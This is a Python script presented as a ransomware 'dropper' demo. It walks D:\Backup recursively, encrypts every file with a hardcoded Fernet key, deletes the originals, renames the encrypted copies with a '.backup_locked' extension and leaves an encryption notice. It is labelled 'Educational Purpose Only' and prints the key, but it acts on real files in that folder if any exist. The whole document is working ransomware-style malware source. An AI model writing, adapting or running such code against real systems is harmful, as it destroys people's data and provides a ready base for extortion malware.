#!/usr/bin/env python3
import os
import sys
import base64
from pathlib import Path
from cryptography.fernet import Fernet

key = b'IJLOYOl16Z-dMsPyp5L-n4BW8BEjXuomDCMG9WOYSMk='
cipher = Fernet(key)
target_dir = Path(r"D:\Backup")
extension = ".backup_locked"

print("=" * 60)
print("BACKUP FOLDER ENCRYPTION DROPPER")
print("=" * 60)
print(f"Target Directory: {target_dir}")
print("=" * 60)

if not target_dir.exists():
    target_dir.mkdir(parents=True)
    print("[INFO] Created target directory")
    
    # Create demo files
    demo_files = {
        "important_backup.txt": "This is important backup data",
        "family_photos.zip": "Family photos archive",
        "work_documents.rar": "Work documents",
        "financial_records.xlsx": "Financial records"
    }
    
    for filename, content in demo_files.items():
        file_path = target_dir / filename
        with open(file_path, 'w') as f:
            f.write(content)
    print("[INFO] Created demo files for testing")

print("[STATUS] Using pre-generated key")
print(f"[KEY] {base64.b64encode(key).decode()}")
print(f"[TARGET] Encrypting files in {target_dir}")

encrypted_count = 0
for file_path in target_dir.rglob("*"):
    if file_path.is_file() and not file_path.name.endswith(extension):
        try:
            print(f"[ENCRYPTING] {file_path.name}")
            
            with open(file_path, 'rb') as f:
                data = f.read()
                
            encrypted_data = cipher.encrypt(data)
            new_path = str(file_path) + extension
            
            with open(new_path, 'wb') as f:
                f.write(encrypted_data)
                
            file_path.unlink()
            encrypted_count += 1
            print(f"  -> Successfully encrypted")
            
        except Exception as e:
            print(f"  -> Failed to encrypt: {e}")

# Create ransom note
note_content = f"""================================
    BACKUP FOLDER ENCRYPTION NOTICE
================================

Your backup files have been encrypted.

Target Directory: {target_dir}
Files Encrypted: {encrypted_count}
Extension Added: {extension}

Save this key for decryption:
{base64.b64encode(key).decode()}

Educational Purpose Only
================================
"""

note_path = target_dir / "BACKUP_ENCRYPTION_NOTICE.txt"
with open(note_path, 'w') as f:
    f.write(note_content)

print(f"[NOTE] Created encryption notice: {note_path.name}")
print(f"[COMPLETE] Encrypted {encrypted_count} files")
print("=" * 60)
input("Press Enter to exit...")
